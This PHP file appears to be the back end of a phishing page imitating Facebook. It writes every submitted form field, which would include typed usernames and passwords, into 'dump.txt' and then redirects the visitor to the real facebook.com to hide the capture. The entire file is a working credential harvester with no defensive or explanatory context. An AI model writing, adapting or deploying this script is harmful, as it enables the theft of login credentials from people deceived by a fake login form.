<?php
$fichier = fopen('dump.txt', 'r+');
file_put_contents('dump.txt', print_r($_POST, true));
fclose($fichier);
header('location: https://facebook.com');



?>


 